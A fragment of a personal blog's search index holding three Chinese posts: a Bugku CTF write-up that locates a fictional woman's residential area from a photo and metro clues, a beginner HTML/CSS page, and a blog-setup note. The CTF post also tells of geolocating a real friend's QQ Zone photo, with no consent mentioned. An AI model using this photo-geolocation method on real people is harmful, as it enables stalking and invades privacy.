恋爱的魅力（哈哈，自己取的名字）（原名：社工进阶搜集）/","link":"","permalink":"http://xjuun.github.io/2021/11/08/ctf%20(bugku)%20%E6%81%8B%E7%88%B1%E7%9A%84%E9%AD%85%E5%8A%9B%EF%BC%88%E5%93%88%E5%93%88%EF%BC%8C%E8%87%AA%E5%B7%B1%E5%8F%96%E7%9A%84%E5%90%8D%E5%AD%97%EF%BC%89%EF%BC%88%E5%8E%9F%E5%90%8D%EF%BC%9A%E7%A4%BE%E5%B7%A5%E8%BF%9B%E9%98%B6%E6%90%9C%E9%9B%86%EF%BC%89/","excerpt":"开局一张图，答案全靠蒙，，，，","text":"开局一张图，答案全靠蒙，，，， 看的我一脸懵逼，这是个啥？让我这个没npy的菜b知道了我找不到npy的原因了，我要加油！我也想要npy啊！！！ 好，我们开始看图，这里要找小美的的小区地址，首先我们看见的是一个塔，好吧，完全不知道这个什么塔（原谅我的无知，，，），看评论之后知道了它是西安的著名景点—大雁塔，额，完全不知道的好吧，，， 评论上说也可以用百度搜图，也可以搜出来，然后我试了一下，就没有然后了，，， 好，接下来我们打开百度地图，搜索大雁塔，我们就能找到它，找了一下它周围的地铁站，是大雁塔站，然后再在百度地图中找西安地铁地铁路线图， 然后看那个图片的评论说做了七站，还转了一站，让你找，运用我小学的排列组合知识，emmm，当时我就不想做了，，， 好，敲黑板，重点来了，仔细看那张评论图片，发现她说距始发站有800多米，下一站有一公里多，接下来我们再看地铁线路图，发现符合距始发站7站的线路只有一个，那么我们就确定了小美家就是在曲韦站跟航天城站之间，然后我们标记这两个站点，用百度测距找一下，发现符合条件的也不多，然后就慢慢试，，， 有兴趣的大家可以试一下，我这里就不透剧了，只能说，好家伙，原来小美还是个白富美，，，接近两万的房价，好家伙，，，我也想要npy，，， 然后感觉这种题目挺有意思的，在qq看点上也看过一些大佬的视频，然后我就在QQ空间找了张好友的图片，然后试了一下，有兴趣的可以自己试一下！ 结果是重庆市的一个街角，百度地图大家可以看看。实景图如下：","categories":[{"name":"CTF","slug":"CTF","permalink":"http://xjuun.github.io/categories/CTF/"}],"tags":[{"name":"ctf","slug":"ctf","permalink":"http://xjuun.github.io/tags/ctf/"},{"name":"misc","slug":"misc","permalink":"http://xjuun.github.io/tags/misc/"}],"keywords":[{"name":"CTF","slug":"CTF","permalink":"http://xjuun.github.io/categories/CTF/"}]},{"title":"小网页（html及css学习小结）","slug":"小网页（html及css学习小结）","date":"2021-11-08T12:43:12.000Z","updated":"2022-04-19T05:09:58.383Z","comments":true,"path":"2021/11/08/小网页（html及css学习小结）/","link":"","permalink":"http://xjuun.github.io/2021/11/08/%E5%B0%8F%E7%BD%91%E9%A1%B5%EF%BC%88html%E5%8F%8Acss%E5%AD%A6%E4%B9%A0%E5%B0%8F%E7%BB%93%EF%BC%89/","excerpt":"很久以前在CSDN上写的，，，无语，听说学web要先学html和css，然后我就看来一遍，历时几个小时，写了一个网页，实现了以下几个功能：1，有背景图；2，有视频；3，有链接；运用的知识点有：css定位，改变字体颜色、大小，视频等。","text":"很久以前在CSDN上写的，，，无语，听说学web要先学html和css，然后我就看来一遍，历时几个小时，写了一个网页，实现了以下几个功能：1，有背景图；2，有视频；3，有链接；运用的知识点有：css定位，改变字体颜色、大小，视频等。 效果图： 12345678910111213141516171819202122232425262728293031323334353637383940&lt;html&gt;&lt;head&gt;&lt;style&gt;#nav &#123; bottom:10px; left:150px; position:relative; font-size: x-large; color:FFFFFF &#125;&lt;/style&gt;&lt;/head&gt;&lt;body background=&quot;file:///D:/231/Desktop/1234.jpeg&quot;style=&quot; background-repeat:no-repeat ;background-size:100% 100%;background-attachment: fixed;&quot;&gt;&lt;h1 align=&quot;center&quot;&gt;许嵩&lt;/h1&gt;&lt;video width=&quot;640&quot; height=&quot;480&quot; controls=&quot;controls&quot; autoplay=&quot;autoplay&quot;&gt; &lt;source src=&quot;file:///D:/231/Desktop/1234.ogg&quot; type=&quot;video/ogg&quot; /&gt; &lt;source src=&quot;file:///D:/231/Desktop/1234.mp4&quot; type=&quot;video/mp4&quot; /&gt; &lt;source src=&quot;file:///D:/231/Desktop/1234.webm&quot; type=&quot;video/webm&quot; /&gt; &lt;object data=&quot;file:///D:/231/Desktop/1234.mp4&quot; width=&quot;320&quot; height=&quot;240&quot;&gt; &lt;embed width=&quot;640&quot; height=&quot;480&quot; src=&quot;file:///D:/231/Desktop/1234.swf&quot; /&gt; &lt;/object&gt;&lt;/video&gt;&lt;div id=&quot;nav&quot;&gt;个人专辑：&lt;br&gt;&lt;a style=&quot;color:inherit;&quot; href=&quot;http://music.163.com/album?id=34749138&amp;userid=1661542444&quot;&gt;青年晚报&lt;/a&gt;&lt;br&gt;&lt;a style=&quot;color:inherit;&quot; href=&quot;http://music.163.com/album?id=16949&amp;userid=1661542444&quot;&gt;素颜&lt;/a&gt;&lt;br&gt;&lt;a style=&quot;color:inherit;&quot; href=&quot;http://music.163.com/album?id=16951&amp;userid=1661542444&quot;&gt;寻雾启示&lt;/a&gt;&lt;br&gt;&lt;a style=&quot;color:inherit;&quot; href=&quot;http://music.163.com/albumid=126996669&amp;userid=1661542444&quot;&gt;呼吸之野&lt;/a&gt;&lt;br&gt;&lt;a style=&quot;color:inherit;&quot; href=&quot;http://music.163.com/album?id=16932&amp;userid=1661542444&quot;&gt;梦游计&lt;/a&gt;&lt;br&gt;......&lt;br&gt;&lt;/div&gt;&lt;/html&gt;","categories":[{"name":"语言学习","slug":"语言学习","permalink":"http://xjuun.github.io/categories/%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0/"}],"tags":[{"name":"html","slug":"html","permalink":"http://xjuun.github.io/tags/html/"},{"name":"鼓捣","slug":"鼓捣","permalink":"http://xjuun.github.io/tags/%E9%BC%93%E6%8D%A3/"},{"name":"小网页","slug":"小网页","permalink":"http://xjuun.github.io/tags/%E5%B0%8F%E7%BD%91%E9%A1%B5/"}],"keywords":[{"name":"语言学习","slug":"语言学习","permalink":"http://xjuun.github.io/categories/%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0/"}]},{"title":"终于搭好了，人麻了","slug":"终于搭好博客了，人麻了","date":"2021-11-07T18:19:12.000Z","updated":"2022-04-19T05:12:40.100Z","comments":true,"path":"2021/11/08/终于搭好博客了，人麻了/","link":"","permalink":"http://xjuun.github.io/2021/11/08/%E7%BB%88%E4%BA%8E%E6%90%AD%E5%A5%BD%E5%8D%9A%E5%AE%A2%E4%BA%86%EF%BC%8C%E4%BA%BA%E9%BA%BB%E4%BA%86/","excerpt":"","text":"感谢大佬涛哥的帮助，半夜一点半点左右，疯狂的发消息开始问大佬，我都不好意思，搞了两天没玩明白的东西，半个小时左右，大佬就隔着屏幕解决了，大佬不愧是大佬，感谢大佬涛哥，第一个博客，就感谢大佬的帮助！","categories":[{"name":"随笔","slug":"随笔","permalink":"http://xjuun.github.io/categories/%E9%9A%8F%E7%AC%94/"}],"tags":[{"name":"生活","slug":"生活","permalink":"http://xjuun.github.io/tags/%E7%94%9F%E6%B4%BB/"}],"keywords":[{"name":"随笔","slug":"随笔","permalink":"http://xjuun.github.io/categories/%E9%9A%8F%E7%AC%94/"}]}]}